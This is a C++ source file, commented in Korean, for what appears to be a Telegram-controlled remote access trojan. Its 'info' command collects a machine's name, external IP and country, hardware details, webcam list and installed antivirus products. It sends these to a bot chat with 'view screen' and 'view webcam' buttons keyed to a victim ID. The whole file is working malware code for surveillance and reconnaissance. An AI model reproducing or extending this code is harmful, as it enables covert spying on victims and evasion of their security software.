#include "Commands.h"
#include "TelegramApi.h"
#include "SystemId.h"
#include "NetInfo.h"
#include "Config.h"

#define NOMINMAX
#include <windows.h>
#include <dxgi1_4.h>    // GPU 이름 / (가능하면) 메모리 사용률
#include <dshow.h>      // 웹캠 나열 (DirectShow)
#include <wbemidl.h>    // WMI (AV 목록)
#include <vector>
#include <string>
#include <memory>
#include <sstream>
#include <iomanip>
// ▼ 추가: (아래 SendTextWithTwoButtons에서 HttpPostForm 사용 시 링킹 보장)
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#define EMO_UTIL   L"\U0001F6E0"      // ?? Hammer & Wrench
#define EMO_SYSTEM L"\U0001F5A5"      // ?? Desktop Computer
#define EMO_WEBCAM L"\U0001F4F7"      // ?? Camera
#define EMO_AV     L"\U0001F6E1"      // ?? Shield

#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")

// ========== 공통 유틸 ==========
static std::wstring Trim(const std::wstring& s) {
    size_t a = s.find_first_not_of(L" \t\r\n");
    size_t b = s.find_last_not_of(L" \t\r\n");
    if (a == std::wstring::npos) return L"";
    return s.substr(a, b - a + 1);
}
static std::wstring FormatBytesUL(ULONGLONG v) {
    const wchar_t* unit[] = { L"B", L"KB", L"MB", L"GB", L"TB" };
    int idx = 0; long double val = (long double)v;
    while (val >= 1024.0 && idx < 4) { val /= 1024.0; ++idx; }
    std::wstringstream ss; ss << std::fixed << std::setprecision((idx == 0) ? 0 : 1) << val << L" " << unit[idx];
    return ss.str();
}
static std::wstring FormatPct(double p) {
    if (p < 0) return L"N/A";
    std::wstringstream ss; ss << std::fixed << std::setprecision(0) << p << L"%";
    return ss.str();
}

// ========== PC 이름 ==========
static std::wstring GetPcName() {
    wchar_t buf[256]; DWORD sz = _countof(buf);
    if (GetComputerNameExW(ComputerNameDnsHostname, buf, &sz)) return buf;
    sz = _countof(buf);
    if (GetComputerNameW(buf, &sz)) return buf;
    return L"UNKNOWN";
}

// ========== 외부 IP/국가(국기) ==========
static void GetIpCountry(std::wstring& ipW, std::wstring& ccW, std::wstring& countryW, std::wstring& flagW) {
    std::string ip, cc, country;
    if (GetExternalIpCountryParts(ip, cc, country)) {
        ipW = std::wstring(ip.begin(), ip.end());
        ccW = std::wstring(cc.begin(), cc.end());
        countryW = std::wstring(country.begin(), country.end());
        flagW = FlagEmojiFromCC(cc);
    }
    else {
        ipW = L"UNKNOWN"; ccW.clear(); countryW = L"UNKNOWN"; flagW.clear();
    }
}

// ========== 업타임 ==========
static std::wstring GetUptime() { return GetUptimePretty(); }

// ========== CPU 이름 & 사용률 ==========
static std::wstring GetCpuName() {
    HKEY h{};
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_QUERY_VALUE, &h) == ERROR_SUCCESS) {
        wchar_t buf[256]; DWORD cb = sizeof(buf), type = 0;
        if (RegQueryValueExW(h, L"ProcessorNameString", nullptr, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS && type == REG_SZ) {
            RegCloseKey(h);
            return Trim(buf);
        }
        RegCloseKey(h);
    }
    return L"UNKNOWN";
}
static bool GetCpuUsagePct(double& pct) {
    FILETIME idle1, kern1, user1, idle2, kern2, user2;
    if (!GetSystemTimes(&idle1, &kern1, &user1)) return false;
    Sleep(200);
    if (!GetSystemTimes(&idle2, &kern2, &user2)) return false;

    auto to64 = [](const FILETIME& ft)->ULONGLONG { ULARGE_INTEGER u; u.LowPart = ft.dwLowDateTime; u.HighPart = ft.dwHighDateTime; return u.QuadPart; };
    ULONGLONG idle = to64(idle2) - to64(idle1);
    ULONGLONG kern = to64(kern2) - to64(kern1);
    ULONGLONG user = to64(user2) - to64(user1);
    ULONGLONG total = kern + user;
    if (total == 0) return false;
    pct = (double)(total - idle) * 100.0 / (double)total;
    if (pct < 0) pct = 0; if (pct > 100) pct = 100;
    return true;
}

// ========== RAM 용량/사용률 ==========
static void GetRamUsage(std::wstring& ramPretty, std::wstring& ramPct) {
    MEMORYSTATUSEX ms{ sizeof(ms) };
    if (GlobalMemoryStatusEx(&ms)) {
        ULONGLONG total = ms.ullTotalPhys;
        ULONGLONG used = ms.ullTotalPhys - ms.ullAvailPhys;
        double pct = (double)used * 100.0 / (double)total;
        ramPretty = FormatBytesUL(total);
        ramPct = FormatPct(pct);
    }
    else {
        ramPretty = L"N/A"; ramPct = L"N/A";
    }
}

// ========== STORAGE 목록 (고정 디스크) ==========
struct DriveItem { std::wstring line; };
static std::vector<DriveItem> GetStorageList() {
    std::vector<DriveItem> out;
    DWORD mask = GetLogicalDrives();
    for (wchar_t d = L'A'; d <= L'Z'; ++d) {
        if (!(mask & (1u << (d - L'A')))) continue;
        wchar_t root[4] = { d, L':', L'\\', 0 };
        if (GetDriveTypeW(root) != DRIVE_FIXED) continue;

        wchar_t label[128] = L""; DWORD fsFlags = 0, ctx = 0, serial = 0, maxCompLen = 0;
        GetVolumeInformationW(root, label, _countof(label), &serial, &maxCompLen, &fsFlags, nullptr, 0);

        ULARGE_INTEGER freeAvail{}, total{}, freeTotal{};
        if (!GetDiskFreeSpaceExW(root, &freeAvail, &total, &freeTotal)) continue;
        ULONGLONG used = total.QuadPart - freeTotal.QuadPart;
        double pct = (total.QuadPart ? (double)used * 100.0 / (double)total.QuadPart : -1.0);

        std::wstring line = L"- ";
        line += root;
        if (label[0]) { line += L"["; line += label; line += L"] "; }
        line += L"총 "; line += FormatBytesUL(total.QuadPart);
        line += L" / "; line += (pct >= 0 ? FormatPct(pct) : L"N/A");
        out.push_back({ line });
    }
    return out;
}

// ========== GPU 이름 & (가능하면) 사용률 ==========
static std::wstring GetGpuNameAndUsage() {
    std::wstring resultName = L"UNKNOWN", resultUsage = L"N/A";

    IDXGIFactory1* f1 = nullptr;
    if (SUCCEEDED(CreateDXGIFactory1(__uuidof(IDXGIFactory1), (void**)&f1)) && f1) {
        IDXGIAdapter1* adp = nullptr;
        if (SUCCEEDED(f1->EnumAdapters1(0, &adp)) && adp) {
            DXGI_ADAPTER_DESC1 desc{};
            if (SUCCEEDED(adp->GetDesc1(&desc))) {
                resultName = desc.Description;
            }
            // 사용률(로컬 비디오 메모리 기준) 시도
            IDXGIAdapter3* a3 = nullptr;
            if (SUCCEEDED(adp->QueryInterface(__uuidof(IDXGIAdapter3), (void**)&a3)) && a3) {
                DXGI_QUERY_VIDEO_MEMORY_INFO info{};
                if (SUCCEEDED(a3->QueryVideoMemoryInfo(0, DXGI_MEMORY_SEGMENT_GROUP_LOCAL, &info))) {
                    if (info.Budget > 0) {
                        double pct = (double)info.CurrentUsage * 100.0 / (double)info.Budget;
                        if (pct < 0) pct = 0; if (pct > 100) pct = 100;
                        resultUsage = FormatPct(pct);
                    }
                }
                a3->Release();
            }
            adp->Release();
        }
        f1->Release();
    }

    std::wstring s = resultName + L" / " + resultUsage;
    return s;
}

// ========== 웹캠 목록 (DirectShow) ==========
static std::vector<std::wstring> GetWebcams() {
    std::vector<std::wstring> cams;
    // COM init
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool uninit = SUCCEEDED(hr);
    ICreateDevEnum* devEnum = nullptr;
    IEnumMoniker* enumMon = nullptr;

    if (SUCCEEDED(CoCreateInstance(CLSID_SystemDeviceEnum, nullptr, CLSCTX_INPROC_SERVER,
        IID_ICreateDevEnum, (void**)&devEnum)) && devEnum) {
        if (devEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &enumMon, 0) == S_OK && enumMon) {
            IMoniker* mon = nullptr;
            while (enumMon->Next(1, &mon, nullptr) == S_OK) {
                IPropertyBag* bag = nullptr;
                if (SUCCEEDED(mon->BindToStorage(0, 0, IID_IPropertyBag, (void**)&bag)) && bag) {
                    VARIANT v; VariantInit(&v);
                    if (SUCCEEDED(bag->Read(L"FriendlyName", &v, 0)) && v.vt == VT_BSTR && v.bstrVal) {
                        cams.push_back(std::wstring(v.bstrVal));
                    }
                    VariantClear(&v);
                    bag->Release();
                }
                mon->Release();
            }
            enumMon->Release();
        }
        devEnum->Release();
    }
    if (uninit) CoUninitialize();
    return cams;
}

// ========== AV 목록 (WMI: root\SecurityCenter2) ==========
static std::vector<std::wstring> GetAvProducts() {
    std::vector<std::wstring> avs;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool uninit = SUCCEEDED(hr);

    // 프로세스 단 한 번만 성공하면 OK라서 실패여도 계속 진행 가능
    CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
        RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr, EOAC_NONE, nullptr);

    IWbemLocator* loc = nullptr;
    IWbemServices* svc = nullptr;

    if (SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (void**)&loc)) && loc) {
        BSTR ns = SysAllocString(L"ROOT\\SecurityCenter2");
        if (SUCCEEDED(loc->ConnectServer(ns, nullptr, nullptr, 0, 0, 0, 0, &svc)) && svc) {
            // 보안 설정
            CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                nullptr, EOAC_NONE);

            BSTR ql = SysAllocString(L"WQL");
            BSTR qs = SysAllocString(L"SELECT displayName FROM AntiVirusProduct");
            IEnumWbemClassObject* pEnum = nullptr;
            hr = svc->ExecQuery(ql, qs,
                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                nullptr, &pEnum);
            if (SUCCEEDED(hr) && pEnum) {
                while (true) {
                    IWbemClassObject* obj = nullptr;
                    ULONG uReturned = 0;

                    // (timeout, count, &obj, &uReturned)
                    hr = pEnum->Next(2000, 1, &obj, &uReturned);
                    if (FAILED(hr) || uReturned == 0) break;

                    VARIANT v; VariantInit(&v);
                    if (SUCCEEDED(obj->Get(L"displayName", 0, &v, nullptr, nullptr))
                        && v.vt == VT_BSTR && v.bstrVal) {
                        avs.emplace_back(v.bstrVal);
                    }
                    VariantClear(&v);
                    obj->Release();
                }
                pEnum->Release();
            }
            SysFreeString(ql); SysFreeString(qs);
            svc->Release();
        }
        SysFreeString(ns);
        loc->Release();
    }
    if (uninit) CoUninitialize();
    return avs;
}

// ====== (추가) 두 개 버튼으로 메시지 보내기 ======
static bool SendTextWithTwoButtons(long long chatId,
    const std::wstring& textW,
    const std::string& label1, const std::string& cb1,
    const std::string& label2, const std::string& cb2) {

    // ... (markup, body 생성 코드는 그대로) ...
    std::string markup =
        "{\"inline_keyboard\":[["
        "{\"text\":\"" + JsonEscape(label1) + "\",\"callback_data\":\"" + JsonEscape(cb1) + "\"},"
        "{\"text\":\"" + JsonEscape(label2) + "\",\"callback_data\":\"" + JsonEscape(cb2) + "\"}"
        "]]}";

    std::string body = "chat_id=" + std::to_string(chatId) +
        "&text=" + UrlEncode(WToUtf8(textW)) +
        "&reply_markup=" + UrlEncode(markup);

    // <<< CHANGED: BOT_TOKEN 부분을 완전히 제거
    std::wstring path = L"/sendMessage";

    std::string resp; bool ok = HttpPostForm(path, body, resp);
    return ok && resp.find("\"ok\":true") != std::string::npos;
}

// ========== 메시지 구성 & 전송 ==========
static bool SendInfoWithScreenButton(long long chatId, const std::string& id8) {
    // [유틸]
    std::wstring pcName = GetPcName();
    std::wstring ipW, ccW, countryW, flagW;
    GetIpCountry(ipW, ccW, countryW, flagW);
    std::wstring uptime = GetUptime();

    // [시스템]
    std::wstring cpuName = GetCpuName();
    double cpuPctD = -1; GetCpuUsagePct(cpuPctD);
    std::wstring cpuLine = cpuName + L" / " + FormatPct(cpuPctD);

    std::wstring ramPretty, ramPct; GetRamUsage(ramPretty, ramPct);
    std::wstring ramLine = ramPretty + L" / " + ramPct;

    std::wstring gpuLine = GetGpuNameAndUsage();

    auto drives = GetStorageList();

    // [Webcam]
    auto cams = GetWebcams();

    // [AV]
    auto avs = GetAvProducts();

    // 보기 좋게 구성
    std::wstring msg;

    // ?? [유틸]
    msg += EMO_UTIL;  msg += L" [유틸]\n";
    msg += L"────────────────\n";
    msg += L"식별자 : " + std::wstring(id8.begin(), id8.end()) + L"\n";
    msg += L"PC명   : " + pcName + L"\n";
    msg += L"아이피 : " + ipW + L"\n";
    msg += L"국가   : " + (flagW.empty() ? L"" : (flagW + L" ")) + (ccW.empty() ? L"" : (ccW + L" / ")) + countryW + L"\n";
    msg += L"업타임 : " + uptime + L"\n\n";

    // ?? [시스템]
    msg += EMO_SYSTEM; msg += L" [시스템]\n";
    msg += L"────────────────\n";
    msg += L"CPU    : " + cpuLine + L"\n";
    msg += L"GPU    : " + gpuLine + L"\n";
    msg += L"RAM    : " + ramLine + L"\n";
    msg += L"STORAGE\n";
    if (drives.empty()) { msg += L"- 없음\n"; }
    else { for (auto& d : drives) msg += d.line + L"\n"; }
    msg += L"\n";

    // ?? [Webcam]
    msg += EMO_WEBCAM; msg += L" [Webcam]\n";
    msg += L"────────────────\n";
    if (cams.empty()) { msg += L"- 없음\n"; }
    else { for (auto& c : cams) msg += L"- " + c + L"\n"; }
    msg += L"\n";

    // ?? [AV]
    msg += EMO_AV;  msg += L" [AV]\n";
    msg += L"────────────────\n";
    if (avs.empty()) { msg += L"- 없음 (또는 조회 실패)\n"; }
    else { for (auto& a : avs) msg += L"- " + a + L"\n"; }

    // ▼ 하단 버튼: "/<ID8> screen" + "/<ID8> webcam"
    const std::string btn1 = WToUtf8(L"화면보기");
    const std::string cb1 = "/" + id8 + " screen";
    const std::string btn2 = WToUtf8(L"웹캠보기");
    const std::string cb2 = "/" + id8 + " webcam";
    return SendTextWithTwoButtons(chatId, msg, btn1, cb1, btn2, cb2);
}

// ========== info 명령 핸들러 ==========
static bool InfoHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
    (void)argsUtf8;
    return SendInfoWithScreenButton(chatId, hwid8);
}

// 자동 등록
struct InfoRegistrar {
    InfoRegistrar() { RegisterCommand("info", &InfoHandler); }
} g_info_registrar;

static std::string WToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return {};
    std::string out(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
    if (!out.empty() && out.back() == '\0') out.pop_back();
    return out;
}

static std::string UrlEncode(const std::string& s) {
    static const char hex[] = "0123456789ABCDEF";
    std::string o;
    o.reserve(s.size() * 3);
    for (unsigned char c : s) {
        if (('a' <= c && c <= 'z') || ('A' <= c && c <= 'Z') || ('0' <= c && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            o.push_back((char)c);
        }
        else {
            o.push_back('%');
            o.push_back(hex[c >> 4]);
            o.push_back(hex[c & 15]);
        }
    }
    return o;
}

static std::string JsonEscape(const std::string& s) {
    std::string o;
    o.reserve(s.size());
    for (char c : s) {
        switch (c) {
        case '\"': o += "\\\""; break;
        case '\\': o += "\\\\"; break;
        case '\b': o += "\\b"; break;
        case '\f': o += "\\f"; break;
        case '\n': o += "\\n"; break;
        case '\r': o += "\\r"; break;
        case '\t': o += "\\t"; break;
        default:
            if ('\x00' <= c && c <= '\x1f') {
                char buf[8];
                sprintf_s(buf, "\\u%04x", (int)c);
                o += buf;
            }
            else {
                o.push_back(c);
            }
        }
    }
    return o;
}